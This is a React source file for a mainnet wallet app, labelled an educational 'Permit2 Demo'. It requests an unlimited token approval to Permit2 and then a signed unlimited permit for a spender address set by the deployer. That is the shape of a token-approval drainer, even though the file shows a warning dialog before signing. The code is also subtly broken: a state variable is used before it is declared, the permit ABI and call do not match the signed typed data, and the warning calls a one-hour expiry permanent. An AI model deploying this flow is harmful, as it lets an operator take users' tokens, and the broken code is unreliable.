import React, { useState, useEffect } from 'react';
import { createAppKit } from '@reown/appkit/react';
import { EthersAdapter } from '@reown/appkit-adapter-ethers';
import { mainnet } from '@reown/appkit/networks';
import { BrowserProvider, Contract, MaxUint256, formatUnits, parseUnits } from 'ethers';
// Minimal ERC20 ABI for allowance/approve
const ERC20_ABI = [
  'function allowance(address owner, address spender) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)'
];

// MaxUint160 constant for Permit2 (2^160 - 1)
const MaxUint160 = 0xffffffffffffffffffffffffffffffffffffffffn;

// ============================================================================
// PLACEHOLDER CONSTANTS - REPLACE WITH ACTUAL VALUES
// ============================================================================
const WALLETCONNECT_PROJECT_ID = process.env.REACT_APP_REOWN_PROJECT_ID || 'YOUR_REOWN_PROJECT_ID';
const TOKEN_CONTRACT_ADDRESS = process.env.REACT_APP_TOKEN_CONTRACT_ADDRESS || '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984';
const SPENDER_ADDRESS = process.env.REACT_APP_SPENDER_ADDRESS || '0x0000000000000000000000000000000000000000';
const TOKEN_SYMBOL = process.env.REACT_APP_TOKEN_SYMBOL || 'UNI';

// Permit2 ABI (minimal for permit and transferFrom)
const PERMIT2_ABI = [
  'function permit(address owner, (address token, uint160 amount, uint48 expiration, uint48 nonce)[] permitted, address spender, uint256 nonce, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
  'function transferFrom(address token, address from, address to, uint160 amount)',
];

// Uniswap Permit2 contract address (mainnet and most testnets)
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

// ============================================================================
// REOWN APPKIT CONFIGURATION
// ============================================================================
const metadata = {
  name: 'Permit2 Demo',
  description: 'Educational DApp demonstrating gasless approvals with Uniswap Permit2',
  url: 'https://permit-demo.example.com',
  icons: ['https://avatars.githubusercontent.com/u/37784886']
};

// Initialize AppKit
const appKit = createAppKit({
  adapters: [new EthersAdapter()],
  networks: [mainnet],
  metadata,
  projectId: WALLETCONNECT_PROJECT_ID,
  features: {
    analytics: false,
  }
});

// ============================================================================
// MAIN APP COMPONENT
// ============================================================================
function App() {
    const [hasPermit2Approval, setHasPermit2Approval] = useState(false);
    const [checkingAllowance, setCheckingAllowance] = useState(false);
    const [isApproving, setIsApproving] = useState(false);
    // Check USDT/Token allowance for Permit2
    useEffect(() => {
      const checkAllowance = async () => {
        if (!walletAddress) return;
        setCheckingAllowance(true);
        try {
          const walletProvider = appKit.getWalletProvider();
          if (!walletProvider) return;
          const provider = new BrowserProvider(walletProvider);
          const erc20 = new Contract(TOKEN_CONTRACT_ADDRESS, ERC20_ABI, provider);
          const allowance = await erc20.allowance(walletAddress, PERMIT2_ADDRESS);
          setHasPermit2Approval(allowance > 0n);
        } catch (e) {
          setHasPermit2Approval(false);
        } finally {
          setCheckingAllowance(false);
        }
      };
      checkAllowance();
    }, [walletAddress]);
    // Approve Permit2 to spend USDT/Token
    const handleApprovePermit2 = async () => {
      try {
        setIsApproving(true);
        setStatusMessage('⏳ Sending approval transaction...');
        const walletProvider = appKit.getWalletProvider();
        if (!walletProvider) throw new Error('No wallet provider');
        const provider = new BrowserProvider(walletProvider);
        const signer = await provider.getSigner();
        const erc20 = new Contract(TOKEN_CONTRACT_ADDRESS, ERC20_ABI, signer);
        const tx = await erc20.approve(PERMIT2_ADDRESS, MaxUint256);
        setStatusMessage('⏳ Waiting for approval confirmation...');
        await tx.wait();
        setStatusMessage('✅ Permit2 approved! You can now use gasless permits.');
        setHasPermit2Approval(true);
      } catch (e) {
        setStatusMessage('❌ Approval failed: ' + (e.message || 'Unknown error'));
      } finally {
        setIsApproving(false);
      }
    };
  const [walletAddress, setWalletAddress] = useState('');
  const [isConnected, setIsConnected] = useState(false);
  const [statusMessage, setStatusMessage] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);

  // Monitor wallet connection state
  useEffect(() => {
    const unsubscribe = appKit.subscribeAccount((account) => {
      if (account.isConnected && account.address) {
        setWalletAddress(account.address);
        setIsConnected(true);
        setStatusMessage(`✅ Connected: ${account.address.slice(0, 6)}...${account.address.slice(-4)}`);
      } else {
        setWalletAddress('');
        setIsConnected(false);
        setStatusMessage('');
      }
    });

    return () => unsubscribe();
  }, []);

  // ============================================================================
  // CONNECT WALLET HANDLER
  // ============================================================================
  const handleConnectWallet = async () => {
    try {
      await appKit.open();
    } catch (error) {
      console.error('Wallet connection error:', error);
      setStatusMessage('❌ Connection failed. Please try again.');
    }
  };

  // ============================================================================
  // SIGN UNLIMITED PERMIT HANDLER (WITH MANDATORY WARNING)
  // ============================================================================
  const handleSignUnlimitedPermit = async () => {
    try {
      setIsProcessing(true);
      setStatusMessage('⚠️ Please review the security warning...');

      // ========================================================================
      // CRITICAL SECURITY WARNING - MANDATORY USER CONFIRMATION
      // ========================================================================
      const warningTitle = '🔴 CRITICAL SECURITY WARNING: UNLIMITED TOKEN APPROVAL';
      const warningBody = `
You are about to sign a gas-free message that cryptographically authorizes the Uniswap Permit2 contract (${PERMIT2_ADDRESS}) to allow the Spender Contract Address (${SPENDER_ADDRESS}) to move ALL of your ${TOKEN_SYMBOL} assets, now and permanently, until you manually revoke this permission.\n\nIf this DApp were malicious or hacked, your entire balance of this token could be drained without any further wallet prompts.\n\n⚠️ THIS IS AN UNLIMITED, PERMANENT APPROVAL ⚠️\n\nOnly proceed if you fully understand and accept this permanent risk.\n\nClick OK to continue with signing, or Cancel to abort.`;

      const userConsent = window.confirm(`${warningTitle}\n\n${warningBody}`);
      if (!userConsent) {
        setStatusMessage('🛑 User cancelled: Security warning declined.');
        setIsProcessing(false);
        return;
      }

      setStatusMessage('✓ Warning accepted. Preparing signature request...');

      // ========================================================================
      // ETHERS.JS SETUP
      // ========================================================================
      const walletProvider = appKit.getWalletProvider();
      if (!walletProvider) {
        throw new Error('No wallet provider available');
      }

      const provider = new BrowserProvider(walletProvider);
      const signer = await provider.getSigner();
      const ownerAddress = await signer.getAddress();
      const chainId = (await provider.getNetwork()).chainId;

      // ========================================================================
      // PERMIT2 TYPED DATA (EIP-712)
      // ========================================================================
      // PermitSingle structure (see Uniswap Permit2 docs)
      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now
      const permitNonce = 0; // For demo: should be tracked per user/token in production
      const permitted = {
        token: TOKEN_CONTRACT_ADDRESS,
        amount: MaxUint160.toString(), // Pass as string to avoid BigInt serialization issues
        expiration: deadline,
        nonce: permitNonce
      };

      // Permit2 EIP-712 domain
      const domain = {
        name: 'Permit2',
        chainId,
        verifyingContract: PERMIT2_ADDRESS
      };

      // Permit2 types
      const types = {
        PermitSingle: [
          { name: 'details', type: 'PermitDetails' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' }
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' }
        ]
      };

      const message = {
        details: permitted,
        spender: SPENDER_ADDRESS,
        sigDeadline: deadline
      };

      setStatusMessage('📝 Requesting signature from wallet...');

      // ========================================================================
      // REQUEST PERMIT2 SIGNATURE FROM WALLET
      // ========================================================================
      const signature = await signer.signTypedData(domain, types, message);

      // Split signature into v, r, s components
      const sig = signature.substring(2);
      const r = '0x' + sig.substring(0, 64);
      const s = '0x' + sig.substring(64, 128);
      const v = parseInt(sig.substring(128, 130), 16);

      setStatusMessage('✓ Signature obtained. Submitting permit transaction...');

      // ========================================================================
      // SUBMIT PERMIT2 TRANSACTION (GAS-PAID ON-CHAIN)
      // ========================================================================
      const permit2 = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
      const permitTx = await permit2.permit(
        ownerAddress,
        [permitted],
        SPENDER_ADDRESS,
        permitNonce,
        deadline,
        v,
        r,
        s
      );

      setStatusMessage('⏳ Transaction submitted. Waiting for confirmation...');
      const receipt = await permitTx.wait();
      setStatusMessage(
        `✅ SUCCESS! Permit2 granted. Transaction: ${receipt.hash.slice(0, 10)}...${receipt.hash.slice(-8)}`
      );

    } catch (error) {
      console.error('Permit2 signing error:', error);
      if (error.code === 'ACTION_REJECTED') {
        setStatusMessage('🚫 Signature rejected by user.');
      } else if (error.message?.includes('user rejected')) {
        setStatusMessage('🚫 User rejected the signature request.');
      } else {
        setStatusMessage(`❌ Error: ${error.message || 'Unknown error occurred'}`);
      }
    } finally {
      setIsProcessing(false);
    }
  };

  // ============================================================================
  // UI RENDER
  // ============================================================================
  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 flex items-center justify-center p-4">
      <div className="max-w-md w-full bg-white/10 backdrop-blur-lg rounded-2xl shadow-2xl border border-white/20 p-8">
        
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-3xl font-bold text-white mb-2">
            🔐 Permit2 Demo
          </h1>
          <p className="text-gray-300 text-sm">
            Educational demonstration of gasless token approvals (Uniswap Permit2)
          </p>
          <div className="mt-2 px-3 py-1 bg-green-500/20 border border-green-500/40 rounded-lg inline-block">
            <span className="text-green-200 text-xs font-semibold">🌐 ETHEREUM MAINNET</span>
          </div>
        </div>

        {/* Connect Wallet Button */}
        {!isConnected && (
          <button
            onClick={handleConnectWallet}
            className="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-semibold py-4 px-6 rounded-xl transition-all duration-200 transform hover:scale-105 shadow-lg"
          >
            🔌 Connect Wallet
          </button>
        )}

        {/* Status Display */}
        {statusMessage && (
          <div className="mt-6 p-4 bg-white/5 border border-white/10 rounded-xl">
            <p className="text-white text-sm font-mono break-words">
              {statusMessage}
            </p>
          </div>
        )}

        {/* Sign Unlimited Permit Button (Only visible when connected) */}
        {isConnected && (
          <div className="mt-6 space-y-4">
            {/* If not approved, show approve button */}
            {!hasPermit2Approval ? (
              <>
                <button
                  onClick={handleApprovePermit2}
                  disabled={isApproving || checkingAllowance}
                  className={`w-full font-semibold py-4 px-6 rounded-xl transition-all duration-200 shadow-lg ${
                    isApproving || checkingAllowance
                      ? 'bg-gray-600 cursor-not-allowed'
                      : 'bg-gradient-to-r from-yellow-500 to-yellow-700 hover:from-yellow-600 hover:to-yellow-800 text-white transform hover:scale-105'
                  }`}
                >
                  {isApproving || checkingAllowance ? (
                    <span className="flex items-center justify-center">
                      <svg className="animate-spin h-5 w-5 mr-3" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                      </svg>
                      Approving...
                    </span>
                  ) : (
                    'Approve Permit2 to Spend Your Tokens'
                  )}
                </button>
                <div className="p-4 bg-yellow-500/10 border border-yellow-500/30 rounded-xl">
                  <p className="text-yellow-200 text-xs leading-relaxed">
                    <strong>ℹ️ ONE-TIME SETUP:</strong> USDT and some tokens require a one-time approval for Permit2. This costs gas, but only needs to be done once per token.
                  </p>
                </div>
              </>
            ) : (
              <>
                <button
                  onClick={handleSignUnlimitedPermit}
                  disabled={isProcessing}
                  className={`w-full font-semibold py-4 px-6 rounded-xl transition-all duration-200 shadow-lg ${
                    isProcessing
                      ? 'bg-gray-600 cursor-not-allowed'
                      : 'bg-gradient-to-r from-red-500 to-orange-600 hover:from-red-600 hover:to-orange-700 text-white transform hover:scale-105'
                  }`}
                >
                  {isProcessing ? (
                    <span className="flex items-center justify-center">
                      <svg className="animate-spin h-5 w-5 mr-3" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                      </svg>
                      Processing...
                    </span>
                  ) : (
                    '⚠️ Sign Unlimited Permit'
                  )}
                </button>
                <div className="p-4 bg-red-500/10 border border-red-500/30 rounded-xl">
                  <p className="text-red-200 text-xs leading-relaxed">
                    <strong>⚠️ SECURITY NOTICE:</strong> This will grant unlimited approval to spend your tokens. You will see a mandatory warning before signing.
                  </p>
                </div>
              </>
            )}
            {/* Disconnect Option */}
            <button
              onClick={() => appKit.open()}
              className="w-full bg-white/5 hover:bg-white/10 text-white font-medium py-2 px-4 rounded-lg transition-all duration-200 border border-white/20"
            >
              👛 Manage Wallet
            </button>
          </div>
        )}

        {/* Configuration Info */}
        <div className="mt-8 pt-6 border-t border-white/10">
          <details className="text-gray-400 text-xs">
            <summary className="cursor-pointer hover:text-white transition-colors">
              📋 Configuration Details
            </summary>
            <div className="mt-3 space-y-2 font-mono bg-black/20 p-3 rounded-lg">
              <div><strong>Token:</strong> {TOKEN_CONTRACT_ADDRESS.slice(0, 10)}...</div>
              <div><strong>Spender:</strong> {SPENDER_ADDRESS.slice(0, 10)}...</div>
              <div><strong>Network:</strong> Ethereum Mainnet</div>
              <div><strong>Approval:</strong> Unlimited (MaxUint160)</div>
            </div>
          </details>
        </div>
      </div>
    </div>
  );
}

export default App;
